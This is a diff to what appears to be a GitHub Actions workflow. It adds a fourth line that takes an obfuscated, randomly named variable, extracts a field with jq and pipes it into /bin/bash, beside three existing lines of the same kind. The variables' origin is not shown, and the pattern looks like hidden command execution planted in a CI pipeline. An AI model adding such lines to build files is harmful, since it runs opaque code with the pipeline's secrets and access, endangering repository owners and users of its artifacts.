@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$fw72856" | jq -r .k42 | /bin/bash
           printf '%s' "$omn80" | jq -r .l22 | /bin/bash
           printf '%s' "$sargq7" | jq -r .p62890 | /bin/bash
+          printf '%s' "$mex1" | jq -r .bas0 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
